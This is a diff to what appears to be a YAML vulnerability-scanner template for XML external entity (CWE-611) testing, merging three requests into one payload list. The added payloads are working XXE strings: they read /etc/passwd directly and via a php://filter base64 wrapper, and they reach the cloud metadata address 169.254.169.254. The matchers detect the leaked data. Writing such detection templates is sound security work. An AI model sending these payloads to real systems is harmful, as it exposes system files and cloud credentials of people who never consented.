@@ -8,8 +8,14 @@ info:
     cwe: "CWE-611"
 requests:
   - method: POST
-    path: "/api/xml"
-    body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
+    path: "/"
+    attack: inject
+    inject_in: body
+    payloads:
+      - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
+    body: "INJECT_HERE"
     headers:
       Content-Type: "application/xml"
     matchers:
@@ -17,45 +23,10 @@ requests:
         part: body
         regex:
           - "root:.*:0:0:"
-          - "bin:.*:1:1:"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: or
-
-  - method: POST
-    path: "/xml/parse"
-    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
-    headers:
-      Content-Type: "application/xml"
-    matchers:
-      - type: regex
-        part: body
-        regex:
           - "ami-id"
-          - "instance-id"
-          - "iam/"
-      - type: status
-        part: status
-        status:
-          - 200
-    matcher_condition: or
-
-  - method: POST
-    path: "/upload/xml"
-    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
-    headers:
-      Content-Type: "application/xml"
-    matchers:
-      - type: regex
-        part: body
-        regex:
           - "cm9vdA=="
-          - "dXNlcg=="
-          - "Ymlu"
       - type: status
         part: status
         status:
           - 200
-    matcher_condition: or
+    matcher_condition: and
